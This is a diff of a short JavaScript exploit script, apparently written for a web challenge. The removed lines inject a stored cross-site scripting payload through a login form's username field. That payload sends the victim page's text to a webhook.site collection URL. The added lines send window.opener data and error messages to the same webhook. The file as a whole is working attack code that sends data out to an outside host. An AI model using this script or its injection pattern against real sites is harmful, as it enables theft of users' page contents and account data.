@@ -6,23 +6,18 @@ const WEBHOOK = "https://webhook.site/abaf4f7a-3e2f-4fb6-aebd-9076e261d651";
 function get(url) {
   let xhr = new XMLHttpRequest();
   xhr.open("GET", url, false);
-  xhr.setRequestHeader("Access-Control-Allow-Origin", ORIGIN);
-  xhr.setRequestHeader("Access-Control-Allow-Methods", "GET, POST");
   return xhr.send(null);
 }
 
 function post(url, data) {
   let xhr = new XMLHttpRequest();
   xhr.open("POST", url, false);
-  xhr.setRequestHeader("Access-Control-Allow-Origin", ORIGIN);
-  xhr.setRequestHeader("Access-Control-Allow-Methods", "GET, POST");
   return xhr.send(data);
 }
 
 try {
-  const payload = `<script>window.location=${WEBHOOK}?${document.body.innerText}</script>`;
-  post(LOGIN, `username=${payload}&secret=overriden_secret`);
-  window.location = PROFILE;
+  if (window.opener) post(WEBHOOK, window.opener);
+  else get(WEBHOOK);
 } catch (error) {
   post(WEBHOOK, `Error: ${error}`);
 }
